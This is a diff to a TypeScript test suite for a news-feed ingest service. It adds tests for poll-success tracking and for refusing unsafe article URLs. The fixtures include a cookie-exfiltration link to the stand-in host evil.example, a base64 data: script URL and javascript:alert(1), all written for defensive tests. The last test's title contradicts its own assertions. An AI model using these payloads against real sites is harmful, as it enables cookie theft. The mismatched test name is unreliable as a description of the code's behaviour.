@@ -21,6 +21,7 @@ import {
   resetDeterministic,
 } from '../testing/test-clocks.js';
 import type { Source, SourceId } from '../domain/types.js';
+import { isSafeExternalUrl } from '../domain/url.js';
 
 class StaticFeedFetcher implements FeedFetcher {
   constructor(private readonly feed: RawFeed) {}
@@ -450,5 +451,129 @@ describe('IngestService', () => {
       ? await storyRepo.getById(firstStoryId as never)
       : null;
     expect(merged?.articleCount).toBe(2);
+  });
+
+  it('records a success when a poll finds nothing new, so a healthy Source is not reported stale', async () => {
+    const entry = CLUSTER_A_ENTRIES[0]!;
+    const { service, sourceRepo, source, clock, replaceFetcher } = await buildService({
+      entries: { entries: [entry] },
+    });
+
+    const first = await service.ingestSource(source.id);
+    expect(first.success).toBe(true);
+    const firstSuccessAt = (await sourceRepo.getById(source.id))?.lastSuccessAt;
+    expect(firstSuccessAt).not.toBeNull();
+
+    // The second poll sees the same feed and inserts nothing. It still worked,
+    // so the Source's last success has to move or the dashboard calls it stale.
+    clock.advance(60 * 60 * 1000);
+    replaceFetcher(new StaticFeedFetcher({ entries: [entry] }));
+    const second = await service.ingestSource(source.id);
+    expect(second.success).toBe(true);
+    expect(second.inserted).toBe(0);
+    expect(second.merged).toBe(0);
+
+    const secondSuccessAt = (await sourceRepo.getById(source.id))?.lastSuccessAt;
+    expect(secondSuccessAt).not.toBeNull();
+    expect(secondSuccessAt!.getTime()).toBeGreaterThan(firstSuccessAt!.getTime());
+  });
+
+  it('records a success for an empty feed', async () => {
+    const { service, sourceRepo, source } = await buildService({
+      entries: { entries: [] },
+    });
+
+    const report = await service.ingestSource(source.id);
+
+    expect(report.success).toBe(true);
+    expect((await sourceRepo.getById(source.id))?.lastSuccessAt).not.toBeNull();
+  });
+
+  it('stores a link the feed gave us only when the scheme is safe to link to', async () => {
+    const entries: RawFeedEntry[] = [
+      {
+        externalId: 'good',
+        url: 'https://www.reuters.com/article/good',
+        title: 'Acme Corp ships a widget',
+        body: CLUSTER_A_BODY,
+        publishedAt: new Date('2026-09-02T10:00:00Z'),
+      },
+      {
+        externalId: 'hostile-js',
+        url: 'javascript:fetch("https://evil.example/"+document.cookie)',
+        title: 'Acme Corp ships a gadget',
+        body: CLUSTER_A_BODY,
+        publishedAt: new Date('2026-09-02T10:05:00Z'),
+      },
+      {
+        externalId: 'hostile-data',
+        url: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+        title: 'Acme Corp ships a gizmo',
+        body: CLUSTER_A_BODY,
+        publishedAt: new Date('2026-09-02T10:10:00Z'),
+      },
+    ];
+    const { service, articleRepo, source } = await buildService({
+      entries: { entries },
+    });
+
+    const report = await service.ingestSource(source.id);
+
+    // The Articles are still kept: their text is what clustering works from.
+    expect(report.success).toBe(true);
+    expect(report.inserted + report.merged).toBe(3);
+    for (const e of entries) {
+      const stored = await articleRepo.findByExternalId(source.id, e.externalId);
+      expect(stored, e.externalId).not.toBeNull();
+      // The invariant is that nothing stored is a link a browser will navigate
+      // somewhere unexpected. An empty url is that: there is no link to click.
+      const navigable = stored!.url !== '' && isSafeExternalUrl(stored!.url);
+      expect(
+        stored!.url === '' || navigable,
+        `${e.externalId} stored ${JSON.stringify(stored!.url)}`,
+      ).toBe(true);
+    }
+    expect((await articleRepo.findByExternalId(source.id, 'good'))?.url).toBe(
+      'https://www.reuters.com/article/good',
+    );
+    // A refused link is stored as nothing rather than as a sentinel a renderer
+    // has to know to check.
+    expect((await articleRepo.findByExternalId(source.id, 'hostile-js'))?.url).toBe('');
+    expect((await articleRepo.findByExternalId(source.id, 'hostile-data'))?.url).toBe('');
+  });
+
+  it('keeps a hostile entry out of the Story its safe siblings would join', async () => {
+    const hostile = CLUSTER_A_ENTRIES[0]!;
+    const { service, storyRepo, articleRepo, source } = await buildService({
+      entries: {
+        entries: [
+          {
+            ...hostile,
+            externalId: 'safe-one',
+            url: 'https://www.reuters.com/article/safe-one',
+          },
+          {
+            ...hostile,
+            externalId: 'hostile',
+            url: 'javascript:alert(1)',
+          },
+        ],
+      },
+    });
+
+    await service.ingestSource(source.id);
+
+    const safeStory = (
+      await articleRepo.findByExternalId(source.id, 'safe-one')
+    )?.storyId;
+    const hostileStory = (
+      await articleRepo.findByExternalId(source.id, 'hostile')
+    )?.storyId;
+    expect(safeStory).not.toBeNull();
+    expect(hostileStory).not.toBeNull();
+    // Same text, so they are the same Story; the difference is only the link.
+    expect(hostileStory).toBe(safeStory);
+    const story = await storyRepo.getById(safeStory as never);
+    expect(story?.articleCount).toBe(2);
   });
 });
